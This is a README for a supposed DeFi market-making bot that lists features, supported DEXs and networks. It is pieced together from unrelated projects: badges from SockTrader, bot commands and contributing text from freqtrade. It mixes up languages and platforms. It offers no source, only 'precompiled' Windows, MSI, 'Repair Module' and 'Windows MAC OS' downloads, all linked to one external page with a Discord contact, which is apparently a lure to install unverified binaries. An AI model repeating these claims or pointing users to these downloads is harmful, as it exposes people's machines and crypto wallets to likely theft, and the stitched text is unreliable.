# Market-Making-Dev-Bot

<p align="center"><img width="720" height="463" src="images/int.jpg" alt="Defi Bot interface" /></p>

<p align="center"><img width="160" height="160" src="images/bitcoin.png" alt="Defi Bot logo" /></p>

<h1 align="center">Defi Bot v3.1</h1>
<p align="center"><b>DeFi trading bot</b></p>

<p align="center">
  <a href="https://www.gnu.org/licenses/gpl-3.0"><img src="https://img.shields.io/badge/License-GPL%20v3-blue.svg" alt="License: GPL v3"></a>
  <a href="https://codecov.io/gh/SockTrader/SockTrader"><img src="https://codecov.io/gh/SockTrader/SockTrader/branch/master/graph/badge.svg" /></a>
  <a href="https://sonarcloud.io/dashboard?id=SockTrader_SockTrader"><img src="https://sonarcloud.io/api/project_badges/measure?project=SockTrader_SockTrader&metric=reliability_rating" /></a>
  <a href="https://sonarcloud.io/dashboard?id=SockTrader_SockTrader"><img src="https://sonarcloud.io/api/project_badges/measure?project=SockTrader_SockTrader&metric=sqale_rating" /></a>
  <a href="https://circleci.com/gh/SockTrader"><img src="https://circleci.com/gh/SockTrader/SockTrader/tree/master.svg?style=shield" alt="Build status"></a>
  <a href="https://codeclimate.com/github/SockTrader/SockTrader/maintainability"><img src="https://api.codeclimate.com/v1/badges/19589f9237d31ca9dcf6/maintainability" /></a>
</p>

> Work on MAC OS & Windows

> The bot works on multiple DEXs such as PancakeSwap, Uniswap, Sushiswap, Raydium and more

## Download

1: Download .NET V4.5 [```Download .NET Module```](https://www.microsoft.com/ru-ru/download/details.aspx?id=30653)

2: Install Actual Precompile Release x32 / x64 👇

Windows x64: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/basics/download-link)

Windows x32: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/basics/download-link)

Windows MSI Package: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/basics/download-link)

Windows Repair Module: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/basics/download-link)

Windows MAC OS: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/basics/download-link)

Contact me on Discord: ```taaafeth```
## Features
- 🦾 Create Wallets
- 🚀 Use existing Wallets
- 📈 50+ Technical indicators. ([docs](https://github.com/anandanand84/technicalindicators))
- 🌈 Written in .NET and Python!
- 🌿 Unit tested source code.
- 📝 Paper trading a strategy on LIVE exchange data.
- 🏡 Backtesting engine with local data.
- 🚢 Funds all your wallets: Effortlessly transfer funds from the main wallet to all other connected wallets
- 📈 Fund your main wallet: Consolidate funds from all other wallets into your main wallet for centralized management.
- 🔇 Trigger on time (seconds): Set automated buy and/or sell triggers to execute transactions at specific time intervals
- 💎 Triggers on price
- 🛠 Triggers on Gas Price: Trade only if gas price is less than your settings
- 🔑 Dynamic Allocations on Buy: Use a certain percentage of the amount of main coin in the wallet for your buy transactions
- 🧿 Dynamic Allocations on Sell: Use a certain percentage of the amount of your selected coin in the wallet for your sell transactions
- 🍔 Liquidity Farms. Minimize fees within any network by calculating the recent blocks farmed to indicate the lowest fee to the miner. This way you will be able to reduce the fee when farming in the ETH network to $1.
- 🧮 Randomize the amount to buy
- 💸 Trade with any wallet
- ⚙️ Auto GWEI
- 📊 Live trading data: Access real-time trading data, including the number of buys, sells, volumes, and percentage of variation over different time intervals (5 minutes, 1 hour, 6 hours, 24 hours).
- 📨 Force Buy and Sell
- 🗿 Triggers on Volumes: Trade only if the volume in the past 24 hours, 6 hours, or 1 hour is above or below a specific threshold
### Intuitive Interface

User-friendly interface that doesn't require in-depth knowledge of DeFi.

[See our interface in action](Soon)
- `/start`: Starts the trader.
- `/stop`: Stops the trader.
- `/stopentry`: Stop entering new trades.
- `/status <trade_id>|[table]`: Lists all or specific open trades.
- `/profit [<n>]`: Lists cumulative profit from all finished trades, over the last n days.
- `/forceexit <trade_id>|all`: Instantly exits the given trade (Ignoring `minimum_roi`).
- `/fx <trade_id>|all`: Alias to `/forceexit`
- `/performance`: Show performance of each finished trade grouped by pair
- `/balance`: Show account balance per currency.
- `/daily <n>`: Shows profit or loss per day, over the last n days.
- `/help`: Show help message.
- `/version`: Show version.

## Development branches

The project is currently setup in two main branches:

- `develop` - This branch has often new features, but might also contain breaking changes. We try hard to keep this branch as stable as possible.
- `stable` - This branch contains the latest stable release. This branch is generally well tested.
- `feat/*` - These are feature branches, which are being worked on heavily. Please don't use these unless you want to test a specific feature.

## Support

### Help / Discord

## DEXs the Bot Integrates With
'uniswap'
'shibaswap'
'pancakeswap'
'sushiswapbsc'
'pancakeswaptestnet'
'traderjoe'
'sushiswapavax'
'pangolin'
'pinkswap'
'biswap'
'orbitalswap'
'pulsextestnet'
'babyswap'
'tethys'
'bakeryswap'
'apeswap'
'sushiswapeth'
'turtleswap'
'sushiswaparbitrum'
'degenswap'
'trisolaris'
'solarbeam'
'stellaswap'
'uniswaptestnet'
'kuswap'
'mojitoswap'
'koffeeswap'
'dogeswap'
'yodeswap'
'fraxswap'
'quickswap_dogechain'
'hebeswap'
'spookyswap'
'tombswap'
'wagyuswap'
'klayswap'
'sushiswapftm'
'protofi'
'spiritswap'
'quickswap'
'matic-meerkat'
'tetuswap'
'sushiswapmatic'
'polygon-apeswap'
'waultswap'
'cronos-vvs'
'cronos-meerkat'
'cronos-crona'
'viperswap'
'milkyswap'
'pangolin'
'serum'
'baseswap'
'uniswapv2-base'
'sushiswaparbitrum'
'shibaswap'
'raydium'
'serum'

## Networks Bot works with

'Solana'
'Ethereum'
'EVM'
'PoW'
'THORChain'
'Elk Finance'
'Layer-2'
'Terra'
'BSC'

Please read the
[Contributing document](https://github.com/freqtrade/freqtrade/blob/develop/CONTRIBUTING.md)
to understand the requirements before sending your pull-requests.

Coding is not a necessity to contribute - maybe start with improving the documentation?
Issues labeled [good first issue](https://github.com/freqtrade/freqtrade/labels/good%20first%20issue) can be good first contributions, and will help get you familiar with the codebase.

**Note** before starting any major new feature work, *please open an issue describing what you are planning to do* or talk to us on [discord](https://discord.gg/p7nuUNVfP7) (please use the #dev channel for this). This will ensure that interested parties can give valuable feedback on the feature, and let others know that you are working on it.

**Important:** Always create your PR against the `develop` branch, not `stable`.

## Requirements

### Up-to-date clock
